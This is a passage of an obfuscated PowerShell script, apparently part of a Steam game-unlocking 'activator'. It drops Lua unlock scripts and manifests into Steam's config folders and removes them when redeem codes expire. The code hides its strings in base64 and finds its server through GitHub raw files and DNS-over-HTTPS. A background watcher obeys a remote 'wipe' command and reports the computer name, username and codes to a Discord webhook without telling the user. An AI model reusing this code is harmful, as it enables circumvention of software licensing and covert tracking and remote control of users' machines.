    if ($expired.Count -gt 0) {
        St7Xb $remaining

        $verify = At5Vc
        $stillBad = @()
        foreach ($v in $verify) {
            $vexp = $v.expires_at -as [datetime]
            if ($vexp -and $vexp -le $now) { $stillBad += $v }
        }
        if ($stillBad.Count -gt 0) {
            $remaining2 = @($verify | Where-Object { $_ -notin $stillBad })
            St7Xb $remaining2
            $remaining = $remaining2
        }
        $expCodes = @($expired | Where-Object { try { [int]$_.duration -gt 0 } catch { $false } } | ForEach-Object { $_.redeem_code } | Where-Object { $_ } | Select-Object -Unique)
        $stillCodes = @($remaining | Where-Object { $_.redeem_code } | ForEach-Object { $_.redeem_code } | Where-Object { $_ } | Select-Object -Unique)
        foreach ($ec in $expCodes) {
            if ($stillCodes -notcontains $ec) { Clear-CdExpiredData $ec }
        }
    }
    return $remaining
}


$PENDING_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfcGVuZGluZ19kZWxldGUuanNvbg=="))
function Pd9Uj {
    try {
        if (Test-Path $PENDING_FILE) {
            $parsed = Get-Content $PENDING_FILE -Raw | ConvertFrom-Json
            $arr = @(foreach ($el in @($parsed)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            return ,@($arr | Where-Object { $_ -and ($_.game_name -or $_.lua_files -or $_.manifest_files) })
        }
    } catch {}
    return ,@()
}
function Sp2Ke {
    param($q)
    try {
        if (-not $q -or $q.Count -eq 0) { [System.IO.File]::WriteAllText($PENDING_FILE, '[]', $script:utf8NoBom) }
        else { [System.IO.File]::WriteAllText($PENDING_FILE, (ConvertTo-Json -InputObject @($q) -Depth 10), $script:utf8NoBom) }
    } catch {}
}
function Ad4Lo {
    param([string]$gameName, [string]$code, [string]$root, [string[]]$luaFiles, [string[]]$manifestFiles)
    try {
        $q = @(Pd9Uj)
        $exists = $false
        for ($i = 0; $i -lt $q.Count; $i++) {
            if ($q[$i].game_name -eq $gameName -and $q[$i].redeem_code -eq $code) {
                $q[$i] = @{ game_name=$gameName; redeem_code=$code; steam_root=$root; lua_files=@($luaFiles); manifest_files=@($manifestFiles); attempts=$q[$i].attempts; last_try=$q[$i].last_try; notified=@($q[$i].notified) }
                $exists = $true; break
            }
        }
        if (-not $exists) { $q += @{ game_name=$gameName; redeem_code=$code; steam_root=$root; lua_files=@($luaFiles); manifest_files=@($manifestFiles); attempts=0; last_try=$null; notified=@() } }
        Sp2Ke $q
    } catch {}
}
function Rp6Mi {
    $q = @(Pd9Uj)
    if ($q.Count -eq 0) { return }
    $remainingQ = @()
    foreach ($e in $q) {
        $root = $e.steam_root
        if (-not $root) { $remainingQ += $e; continue }
        if (-not (Test-Path $root)) {
            $fbRoots = @(Find-SteamRoots)
            foreach ($fb in $fbRoots) {
                $probe = Join-Path $fb (S("Y29uZmlnXHN0cGx1Zy1pbg=="))
                if (Test-Path $probe) { $root = $fb; $e.steam_root = $fb; break }
            }
            if (-not (Test-Path $root)) { $remainingQ += $e; continue }
        }
        $still = @()
        foreach ($f in @($e.lua_files)) {
            $p1 = Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f
            $p2 = Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f
            Remove-FileHard $p1; Remove-FileHard $p2
            if ((Test-Path $p1) -or (Test-Path $p2)) { $still += $f }
        }
        foreach ($f in @($e.manifest_files)) {
            $p3 = Join-Path (Join-Path $root "config\depotcache") $f
            Remove-FileHard $p3
            if (Test-Path $p3) { $still += $f }
        }
        if ($still.Count -eq 0) {
            try { Add-Content -Path (Join-Path $env:TEMP (S("YnNtYXBfanVlZ29fZXhwaXJhZG8ubG9n"))) -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] RETRY COMPLETO: $($e.game_name) (codigo: $($e.redeem_code))" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
            continue
        }
        $attempts = ([int]$e.attempts) + 1
        $notified = @(if ($e.notified) { $e.notified } else { @() })
        if (($attempts -eq 1 -or $attempts -eq 3 -or $attempts -eq 5 -or $attempts -eq 10 -or $attempts % 20 -eq 0) -and $notified -notcontains $attempts) {
            $notified += $attempts
            try {
                $bt = [char]96
                $content = "**ALERTA BORRADO (intento $attempts):** $($e.game_name)`n**Codigo:** $bt$bt$bt$($e.redeem_code)$bt$bt$bt`n**Aun en disco:** $($still.Count) archivos`n$bt$bt$bt$($still -join "`n")$bt$bt$bt"
                $payload = @{ content = $content } | ConvertTo-Json
                Send-DiscordJson $WEBHOOK_URL $payload 10 | Out-Null
            } catch {}
        }
        $remainingQ += @{ game_name=$e.game_name; redeem_code=$e.redeem_code; steam_root=$root; lua_files=@($e.lua_files); manifest_files=@($e.manifest_files); attempts=$attempts; last_try=(Get-Date).ToString('o'); notified=$notified }
    }
    Sp2Ke $remainingQ
}


function Check-RemoteWipe {
    try {
        $cid=$script:clientId; if (-not $cid) { return }
        $body=@{client_id=$cid} | ConvertTo-Json
        $resp=$null; try { $resp=Invoke-RestMethod -Uri "$($script:serverUrl)/api/check-wipe" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue } catch {}
        if ($resp -and $resp.wipe) {
            $timers=At5Vc
            if ($timers.Count -gt 0) {
                $backupRoot=Join-Path $env:LOCALAPPDATA "BastissSteam\backup\wipe_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$([guid]::NewGuid().ToString('N').Substring(0,6))"
                try { New-Item -ItemType Directory -Path $backupRoot -Force | Out-Null } catch {}
                foreach ($t in $timers) {
                    $root=$t.steam_root; if (-not $root) { continue }
                    foreach ($f in @($t.lua_files)) {
                        $p1=Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f; $p2=Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f
                        try { if (Test-Path -LiteralPath $p1) { Copy-Item -LiteralPath $p1 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}
                        try { if (Test-Path -LiteralPath $p2) { Copy-Item -LiteralPath $p2 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}
                        Remove-FileHard $p1; Remove-FileHard $p2
                    }
                    foreach ($f in @($t.manifest_files)) { $p3=Join-Path (Join-Path $root "config\depotcache") $f; try { if (Test-Path -LiteralPath $p3) { Copy-Item -LiteralPath $p3 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}; Remove-FileHard $p3 }
                }
                St7Xb @(); $script:activeCodes.Clear()
                try { $bt=[char]96; $content="**WIPE REMOTO:** $env:COMPUTERNAME / $([Environment]::UserName) ClientID:$cid - Borrados $($timers.Count) juegos backup:$backupRoot"; $payload=@{content=$content}|ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
                try { Add-Content -Path (Join-Path $env:TEMP "bsmap_wipe.log") -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] WIPE $($timers.Count) juegos backup $backupRoot" -Encoding UTF8 } catch {}
            }
            try { $b2=@{client_id=$cid} | ConvertTo-Json; Invoke-RestMethod -Uri "$($script:serverUrl)/api/clear-wipe" -Method Post -Body $b2 -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
        }
    } catch {}
}
if ($script:expiryWatcher) {
    $expMutex = $null
    try {
        $expMutexCreated = $false
        $expMutex = New-Object System.Threading.Mutex($true, 'Local\BastissSteamExpiryMutex', [ref]$expMutexCreated)
        if (-not $expMutexCreated) { try { $expMutex.Dispose() } catch {}; exit }
    } catch { $expMutex = $null }
    try { WEL 'Watcher de expiracion iniciado' } catch {}
    try {
        $selfPath = [Environment]::GetCommandLineArgs()[0]
        $appProcessPrefix = 'BastissSteamActivator'
        while ($true) {
            try {
                $guiRunning = @(Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID -and $_.ProcessName -like "$appProcessPrefix*" })
                if ($guiRunning.Count -eq 0) {
                    try { Rm9xExp | Out-Null } catch {}
                    try { Rp6Mi } catch {}
                }
                try { Check-RemoteWipe } catch {}
            } catch {}
            Start-SleepDoEvents 10000
        }
    } finally { if ($expMutex) { try { $expMutex.Dispose() } catch {} } }
    exit
}


$script:serverUrl = "http://127.0.0.1:18880"
$script:serverIp = ""
$script:serverUrlCf = ""
$script:serverIpCf = ""
$script:ghRawUrlCf = "https://raw.githubusercontent.com/bastisayes/BastissSteamV18/main/current_url_cf.txt"
$script:ghRawIpCf = "https://raw.githubusercontent.com/bastisayes/BastissSteamV18/main/current_ip_cf.txt"
$script:serverOverrideFile = Join-Path $env:LOCALAPPDATA "BastissSteam\server_token_override.txt"
$script:ghApiUrlBase = (S("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9iYXN0aXNheWVzL0ZpeGVzLXN0ZWFtL2NvbnRlbnRzL2N1cnJlbnRfdXJsLnR4dA=="))
$script:ghRawUrl = (S("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvQmFzdGlzc1N0ZWFtVjE4L21haW4vY3VycmVudF91cmwudHh0"))
$script:ghApiIpUrl = (D "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9iYXN0aXNheWVzL0ZpeGVzLXN0ZWFtL2NvbnRlbnRzL2N1cnJlbnRfaXAudHh0")
$script:ghRawIpUrl = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvQmFzdGlzc1N0ZWFtVjE4L21haW4vY3VycmVudF9pcC50eHQ=")
function Invoke-CurlHidden {
    param([string[]]$Arguments, [int]$TimeoutSec = 30, [switch]$NeedOut, [switch]$NeedErr)
    $res = @{ exit = -1; out = ""; err = "" }
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "curl.exe"
        $psi.Arguments = (($Arguments | ForEach-Object { if ($_ -match '\s') { '"' + ($_ -replace '"','\"') + '"' } else { $_ } }) -join ' ')
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        if ($NeedOut) { $psi.RedirectStandardOutput = $true }
        if ($NeedErr) { $psi.RedirectStandardError = $true }
        $p = New-Object System.Diagnostics.Process
        $p.StartInfo = $psi
        [void]$p.Start()
        if (-not $p.WaitForExit($TimeoutSec * 1000)) { try { $p.Kill() } catch {}; return $res }
        $res.exit = $p.ExitCode
        if ($NeedOut) { try { $res.out = $p.StandardOutput.ReadToEnd() } catch {} }
        if ($NeedErr) { try { $res.err = $p.StandardError.ReadToEnd() } catch {} }
    } catch {}
    return $res
}
function Resolve-ServerIpDoH {
    param([string]$hn)
    $hn = ([string]$hn).Trim().ToLower()
    if (-not $hn -or $hn -eq 'localhost' -or $hn -match '^\d{1,3}(\.\d{1,3}){3}$') { return "" }
    $tmp = Join-Path $env:TEMP 'bsmap_doh.json'
    $qs = @(
        @("https://8.8.8.8/resolve?name=$hn&type=A", $false),
        @("https://1.1.1.1/dns-query?name=$hn&type=A", $true)
    )
    foreach ($q in $qs) {
        try {
            try { if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue } } catch {}
            $cargs = @('-s','-k','--ssl-no-revoke','--tlsv1.2','--noproxy','*','--max-time','5')
            if ($q[1]) { $cargs += @('-H','Accept: application/dns-json') }
            $cargs += @('-o',$tmp,$q[0])
            $crDoH = Invoke-CurlHidden $cargs 5
            if ($crDoH.exit -eq 0 -and (Test-Path -LiteralPath $tmp)) {
                try {
                    $dj = [System.IO.File]::ReadAllText($tmp) | ConvertFrom-Json
                    foreach ($an in @($dj.Answer)) {
                        $dip = [string]$an.data
                        if ($an.type -eq 1 -and $dip -match '^\d{1,3}(\.\d{1,3}){3}$' -and $dip -notmatch '^(100\.|10\.|127\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)') { return $dip }
                    }
                } catch {}
            }
        } catch {}
    }
    try { if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue } } catch {}
    return ""
}
function Update-ServerUrl {
    $ovPinned = $false
    try { if ($script:lastUrlOk -and ((Get-Date) - $script:lastUrlOk).TotalSeconds -lt 120) { return } } catch {}
    try {
        if (Test-Path -LiteralPath $script:serverOverrideFile) {
            $ov = ([System.IO.File]::ReadAllText($script:serverOverrideFile)).Trim()
            if ($ov -match "^https?://") { $script:serverUrl = $ov; $script:serverIp = ""; $ovPinned = $true }
        }
    } catch {}
    if (-not $ovPinned) {
        $cacheFile = Join-Path $env:LOCALAPPDATA "BastissSteam\server_url_cached.txt"
        $gotUrl = $false
        try {
            $ghu = ([string](Invoke-RestMethod -Uri ($script:ghRawUrl + '?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()) -UseBasicParsing -TimeoutSec 5 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop)).Trim()
            if ($ghu -match "^https?://\S+$") {
                $script:serverUrl = $ghu
                $gotUrl = $true
                try { [System.IO.File]::WriteAllText($cacheFile, $ghu, (New-Object System.Text.UTF8Encoding $false)) } catch {}
            }
        } catch {}
        if (-not $gotUrl) {
            if (Test-Path -LiteralPath $cacheFile) {
                try {
                    $cu = ([System.IO.File]::ReadAllText($cacheFile)).Trim()
                    if ($cu -match "^https?://\S+$") { $script:serverUrl = $cu; $gotUrl = $true }
                } catch {}
            }
        }
        if (-not $gotUrl) { $script:serverUrl = "http://127.0.0.1:18880" }
    }
    try {
        $ghi = ([string](Invoke-RestMethod -Uri ($script:ghRawIpUrl + '?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()) -UseBasicParsing -TimeoutSec 6 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop)).Trim()
        if ($ghi -match '^\d{1,3}(\.\d{1,3}){3}$') { $script:serverIp = $ghi } else { $script:serverIp = "" }
    } catch { $script:serverIp = "" }
    if ($script:serverUrl -match '^https://' -and -not $script:serverIp) {
        $ipCacheFile = Join-Path $env:LOCALAPPDATA "BastissSteam\server_ip_cached.txt"
        try {
            $hnNow = ([uri]$script:serverUrl).Host
            if ($hnNow -and $hnNow -ne '127.0.0.1' -and $hnNow -ne 'localhost') {
                $dohIp = Resolve-ServerIpDoH $hnNow
                if ($dohIp -match '^\d{1,3}(\.\d{1,3}){3}$') {
                    $script:serverIp = $dohIp
                    try { [System.IO.File]::WriteAllText($ipCacheFile, $dohIp, (New-Object System.Text.UTF8Encoding $false)) } catch {}
                }
            }
        } catch {}
        if (-not $script:serverIp) {
            try {
                if (Test-Path -LiteralPath $ipCacheFile) {
                    $cip = ([System.IO.File]::ReadAllText($ipCacheFile)).Trim()
                    if ($cip -match '^\d{1,3}(\.\d{1,3}){3}$') { $script:serverIp = $cip }
                }
            } catch {}
        }
    }
    $cfCacheFile = Join-Path $env:LOCALAPPDATA "BastissSteam\server_url_cf_cached.txt"
    $gotCf = $false
    $cfDbg = Join-Path $env:TEMP 'bsmap_cf_debug.log'
    for ($cfTry = 0; $cfTry -lt 2 -and -not $gotCf; $cfTry++) {
        try {
            $cfu2 = ([string](Invoke-RestMethod -Uri ($script:ghRawUrlCf + '?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()) -UseBasicParsing -TimeoutSec 4 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop)).Trim()
            if ($cfu2 -match "^https?://\S+$") {
                $script:serverUrlCf = $cfu2
                $gotCf = $true
                try { [System.IO.File]::WriteAllText($cfCacheFile, $cfu2, (New-Object System.Text.UTF8Encoding $false)) } catch {}
            }
        } catch {
            try { Add-Content -LiteralPath $cfDbg -Value "[$(Get-Date -Format 'HH:mm:ss')] CF-RAW intento $($cfTry+1) fallo: $($_.Exception.Message)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
            try { Start-Sleep -Milliseconds 800 } catch {}
        }
    }
    if (-not $gotCf) {
        try {
            $cfApi = Invoke-RestMethod -Uri ('https://api.github.com/repos/bastisayes/BastissSteamV18/contents/current_url_cf.txt?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()) -UseBasicParsing -TimeoutSec 8 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop
            if ($cfApi.content) {
                $cfb = ([string]$cfApi.content).Replace("`n","").Replace("`r","").Replace(" ","")
                $cfu3 = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cfb))).Trim()
                if ($cfu3 -match "^https?://\S+$") {
                    $script:serverUrlCf = $cfu3
                    $gotCf = $true
                    try { [System.IO.File]::WriteAllText($cfCacheFile, $cfu3, (New-Object System.Text.UTF8Encoding $false)) } catch {}
                }
            }
        } catch {
            try { Add-Content -LiteralPath $cfDbg -Value "[$(Get-Date -Format 'HH:mm:ss')] CF-API fallo: $($_.Exception.Message)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
        }
    }
    if (-not $gotCf) {
        try {
            if (Test-Path -LiteralPath $cfCacheFile) {
                $ccfu = ([System.IO.File]::ReadAllText($cfCacheFile)).Trim()
                if ($ccfu -match "^https?://\S+$") { $script:serverUrlCf = $ccfu; $gotCf = $true }
            }
        } catch {}
    }
    if (-not $gotCf) { $script:serverUrlCf = "" }
    try {
        $cfIpRaw = ([string](Invoke-RestMethod -Uri ($script:ghRawIpCf + '?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()) -UseBasicParsing -TimeoutSec 4 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop)).Trim()
        if ($cfIpRaw -match '^\d{1,3}(\.\d{1,3}){3}$') { $script:serverIpCf = $cfIpRaw } else { $script:serverIpCf = "" }
    } catch { $script:serverIpCf = "" }
    if ($script:serverUrlCf -match '^https://' -and $script:serverUrlCf -ne $script:serverUrl -and -not $script:serverIpCf) {
        $ipCfCacheFile = Join-Path $env:LOCALAPPDATA "BastissSteam\server_ip_cf_cached.txt"
        try {
            $hnCf = ([uri]$script:serverUrlCf).Host
            if ($hnCf -and $hnCf -ne '127.0.0.1' -and $hnCf -ne 'localhost') {
                $dohCf = Resolve-ServerIpDoH $hnCf
                if ($dohCf -match '^\d{1,3}(\.\d{1,3}){3}$') {
                    $script:serverIpCf = $dohCf
                    try { [System.IO.File]::WriteAllText($ipCfCacheFile, $dohCf, (New-Object System.Text.UTF8Encoding $false)) } catch {}
                }
            }
        } catch {}
        if (-not $script:serverIpCf) {
            try {
                if (Test-Path -LiteralPath $ipCfCacheFile) {
                    $ccf = ([System.IO.File]::ReadAllText($ipCfCacheFile)).Trim()
                    if ($ccf -match '^\d{1,3}(\.\d{1,3}){3}$') { $script:serverIpCf = $ccf }
                }
            } catch {}
        }
    }
    try { $script:lastUrlOk = Get-Date } catch {}
}

try {
    if (Test-Path -LiteralPath $script:serverOverrideFile) {
        $ov0 = ([System.IO.File]::ReadAllText($script:serverOverrideFile)).Trim()
        if ($ov0 -match "^https?://") { $script:serverUrl = $ov0 }
    }
} catch {}


function Bn6Lc {
    param([string]$url, [string]$outFile, $progressBar = $null, [int]$progressStart = 0, [int]$progressEnd = 100)
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    if ($url -match "github\.com.*/raw/|githubusercontent\.com|github\.com.*/releases/download/") {
        $dlUrl = $url; $cc = $null
    } else {
        $pageReq = [System.Net.HttpWebRequest]::Create($url)
        $pageReq.Method = "GET"; $pageReq.UserAgent = $ua; $pageReq.AllowAutoRedirect = $true
        $pageReq.Timeout = 30000; $pageReq.ReadWriteTimeout = 30000
        $pageReq.ServicePoint.Expect100Continue = $false; $pageReq.ServicePoint.UseNagleAlgorithm = $false
        $pageReq.ProtocolVersion = [System.Net.HttpVersion]::Version11; $pageReq.KeepAlive = $true
        $cc = New-Object System.Net.CookieContainer; $pageReq.CookieContainer = $cc
        $pageResp = $pageReq.GetResponse()
        $sr = New-Object System.IO.StreamReader $pageResp.GetResponseStream()
        $html = $sr.ReadToEnd()
        $sr.Close(); $pageResp.Close()
        $m = [regex]::Match($html, 'class="input\s+popsok"[^>]*href="([^"]+)"')
        if (-not $m.Success) { throw "No se pudo obtener el enlace de descarga de MediaFire." }
        $dlUrl = $m.Groups[1].Value
        $pageReq = $null; $pageResp = $null
    }
    [System.Net.ServicePointManager]::DefaultConnectionLimit = 128
    [System.Net.ServicePointManager]::Expect100Continue = $false
    $headReq = [System.Net.HttpWebRequest]::Create($dlUrl)
    $headReq.Method = "HEAD"; $headReq.UserAgent = $ua; $headReq.AllowAutoRedirect = $true
    $headReq.Timeout = 15000
    if ($cc) { $headReq.CookieContainer = $cc }
    $headResp = $headReq.GetResponse()
    $totalSize = $headResp.ContentLength
    $headResp.Close()
    if ($totalSize -le 0) {
        $dlReq2 = [System.Net.HttpWebRequest]::Create($dlUrl)
        $dlReq2.Method = "GET"; $dlReq2.UserAgent = $ua; $dlReq2.AllowAutoRedirect = $true
        $dlReq2.Timeout = 30000; $dlReq2.ReadWriteTimeout = 60000
        if ($cc) { $dlReq2.CookieContainer = $cc }
        $dlResp2 = $dlReq2.GetResponse()
        $totalSize = $dlResp2.ContentLength
        $str2 = $dlResp2.GetResponseStream(); $buf2 = New-Object byte[] 262144
        $fs2 = Safe-FileCreate $outFile; $tr = 0; $lp = -1
        try { while (($n2 = $str2.Read($buf2, 0, $buf2.Length)) -gt 0) { $fs2.Write($buf2, 0, $n2); $tr += $n2; if ($totalSize -gt 0 -and $progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $tr / $totalSize)); if ($pct -ne $lp) { $progressBar.Value = $pct; $lp = $pct; [System.Windows.Forms.Application]::DoEvents() } } else { [System.Windows.Forms.Application]::DoEvents() } } }
        finally { $str2.Close(); $fs2.Close(); $dlResp2.Close() }
        return
    }
    $connections = if ($totalSize -lt 5MB) { 4 } elseif ($totalSize -lt 20MB) { 8 } elseif ($totalSize -lt 100MB) { 16 } elseif ($totalSize -lt 500MB) { 24 } else { 32 }
    if ($connections -le 1) {
        $dlReq3 = [System.Net.HttpWebRequest]::Create($dlUrl)
        $dlReq3.Method = "GET"; $dlReq3.UserAgent = $ua; $dlReq3.AllowAutoRedirect = $true
        $dlReq3.Timeout = 120000; $dlReq3.ReadWriteTimeout = 120000
        $dlReq3.ServicePoint.Expect100Continue = $false; $dlReq3.ServicePoint.UseNagleAlgorithm = $false
        $dlReq3.ProtocolVersion = [System.Net.HttpVersion]::Version11; $dlReq3.KeepAlive = $true
        if ($cc) { $dlReq3.CookieContainer = $cc }
        $dlResp3 = $dlReq3.GetResponse()
        $str3 = $dlResp3.GetResponseStream(); $buf3 = New-Object byte[] 262144
        $fs3 = Safe-FileCreate $outFile; $tr3 = 0; $lp3 = -1
        try { while (($n3 = $str3.Read($buf3, 0, $buf3.Length)) -gt 0) { $fs3.Write($buf3, 0, $n3); $tr3 += $n3; if ($progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $tr3 / $totalSize)); if ($pct -ne $lp3) { $progressBar.Value = $pct; $lp3 = $pct; [System.Windows.Forms.Application]::DoEvents() } } else { [System.Windows.Forms.Application]::DoEvents() } } }
        finally { $str3.Close(); $fs3.Close(); $dlResp3.Close() }
        return
    }
    $chunkSize = [math]::Ceiling($totalSize / $connections)
    $tempDir = [System.IO.Path]::GetTempPath()
    $fileBase = [System.IO.Path]::GetFileNameWithoutExtension($outFile) + "_mfdl"
    $chunkFiles = @(); $runspaces = @(); $maxRetries = 3; $bufSize = 262144
    for ($i = 0; $i -lt $connections; $i++) {
        $start = $i * $chunkSize
        if ($start -ge $totalSize) { break }
        $end = [math]::Min($start + $chunkSize - 1, $totalSize - 1)
        $chunkFile = Join-Path $tempDir "${fileBase}_${i}.tmp"
        $chunkFiles += $chunkFile
        $cs = { param($u, $s, $e, $o, $ua2, $cc2, $bs, $mr)
            $le = $null
            for ($a = 1; $a -le $mr; $a++) {
                try {
                    $r = [System.Net.HttpWebRequest]::Create($u)
                    $r.Method = "GET"; $r.UserAgent = $ua2; $r.AllowAutoRedirect = $true
                    $r.Timeout = 120000; $r.ReadWriteTimeout = 120000
                    $r.ServicePoint.Expect100Continue = $false; $r.ServicePoint.UseNagleAlgorithm = $false
                    $r.ProtocolVersion = [System.Net.HttpVersion]::Version11; $r.KeepAlive = $true
                    if ($cc2) { $r.CookieContainer = $cc2 }
                    $r.AddRange($s, $e)
                    $rp = $r.GetResponse()
                    try { if (Test-Path -LiteralPath $o) { Remove-Item -LiteralPath $o -Force -ErrorAction SilentlyContinue } } catch {}
                    try { $d2=Split-Path $o -Parent; if ($d2 -and -not (Test-Path $d2)) { New-Item -ItemType Directory -Path $d2 -Force | Out-Null } } catch {}
                    $f = [System.IO.File]::Create($o)
                    $st = $rp.GetResponseStream(); $b = New-Object byte[] $bs
                    while (($nr = $st.Read($b, 0, $bs)) -gt 0) { $f.Write($b, 0, $nr) }
                    $f.Close(); $st.Close(); $rp.Close()
                    return
                } catch { $le = $_; if (Test-Path $o) { Remove-Item $o -Force -ErrorAction SilentlyContinue } }
            }
            throw "Chunk failed after $mr attempts: $le"
        }
        $ps = [powershell]::Create(); $rs = [RunspaceFactory]::CreateRunspace()
        $ps.Runspace = $rs; $rs.Open()
        [void]$ps.AddScript($cs).AddArgument($dlUrl).AddArgument([long]$start).AddArgument([long]$end).AddArgument($chunkFile).AddArgument($ua).AddArgument($cc).AddArgument($bufSize).AddArgument($maxRetries)
        $runspaces += @{ps=$ps;handle=$ps.BeginInvoke();file=$chunkFile;rs=$rs}
    }
    $chunkErrors = @(); $completed = 0; $totalChunks = $runspaces.Count
    foreach ($rs2 in $runspaces) {
        try { $rs2.ps.EndInvoke($rs2.handle); $completed++ }
        catch { $chunkErrors += "[$($rs2.file)] $($_.Exception.Message)" }
        $rs2.ps.Dispose(); $rs2.rs.Dispose()
        if ($progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $completed / $totalChunks)); $progressBar.Value = $pct; [System.Windows.Forms.Application]::DoEvents() }
    }
    if ($chunkErrors.Count -gt 0) {
        foreach ($cf in $chunkFiles) { if (Test-Path $cf) { Remove-Item $cf -Force -ErrorAction SilentlyContinue } }
        throw "Error en descarga segmentada: $($chunkErrors -join '; ')"
    }
    $fsOut = Safe-FileCreate $outFile
    $mergeBuf = New-Object byte[] 1048576
    foreach ($cf in $chunkFiles) {
        $fsIn = [System.IO.File]::OpenRead($cf)
        while (($nm = $fsIn.Read($mergeBuf, 0, $mergeBuf.Length)) -gt 0) { $fsOut.Write($mergeBuf, 0, $nm) }
        $fsIn.Close()
    }
    $fsOut.Close()
    foreach ($cf in $chunkFiles) { Remove-Item $cf -Force -ErrorAction SilentlyContinue }
    $actualSize = (Get-Item $outFile).Length
    if ($actualSize -ne $totalSize) {
        Remove-Item $outFile -Force -ErrorAction SilentlyContinue
        throw "Tamano incorrecto: $actualSize vs $totalSize"
    }
    if ($progressBar) { $progressBar.Value = $progressEnd; [System.Windows.Forms.Application]::DoEvents() }
}


function Extract-AndInstall {
    param([string]$zipPath, [string]$gameName = $null, $expirationDate = $null, [string]$code = $null)
    $steamRoot = Get-SteamPath
    $luaDir = Join-Path $steamRoot (S("Y29uZmlnXHN0cGx1Zy1pbg=="))
    $luaDir2 = Join-Path $steamRoot (S("Y29uZmlnXGx1YQ=="))
    $manifestDir = Join-Path $steamRoot "config\depotcache"
    $manifestDirRoot = Join-Path $steamRoot "depotcache"
    if (-not (Test-Path $luaDir)) { New-Item -ItemType Directory -Path $luaDir -Force | Out-Null }
    if (-not (Test-Path $luaDir2)) { New-Item -ItemType Directory -Path $luaDir2 -Force | Out-Null }
    if (-not (Test-Path $manifestDir)) { New-Item -ItemType Directory -Path $manifestDir -Force | Out-Null }
    if (-not (Test-Path $manifestDirRoot)) { New-Item -ItemType Directory -Path $manifestDirRoot -Force | Out-Null }
    $tempDir = Join-Path $env:TEMP "bsmap_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    $result = @{ lua = @(); manifest = @(); steamRoot = $steamRoot }
    try {
        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
        $manifestNames = @(Get-ChildItem -Path $tempDir -Recurse -Filter *.manifest | ForEach-Object { $_.Name })
        if ($gameName -and $expirationDate) {
            $header = "-- BSMAP_EXPIRES:$($expirationDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gameName`n"
            if ($manifestNames.Count -gt 0) { $header += "-- BSMAP_MANIFESTS:$($manifestNames -join ',')`n" }
            if ($code) { $header += "-- BSMAP_CODE:$code`n" }
            Get-ChildItem -Path $tempDir -Recurse -Filter *.lua | ForEach-Object {
                try { $c = [System.IO.File]::ReadAllText($_.FullName); [System.IO.File]::WriteAllText($_.FullName, $header + $c) } catch {}
            }
        }
        Get-ChildItem -Path $tempDir -Recurse -Filter *.lua | ForEach-Object { Copy-Item -Path $_.FullName -Destination $luaDir -Force; Copy-Item -Path $_.FullName -Destination $luaDir2 -Force; $result.lua += $_.Name }
        Get-ChildItem -Path $tempDir -Recurse -Filter *.manifest | ForEach-Object { Copy-Item -Path $_.FullName -Destination $manifestDir -Force; Copy-Item -Path $_.FullName -Destination $manifestDirRoot -Force; $result.manifest += $_.Name }
    } finally {
        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    return $result
}


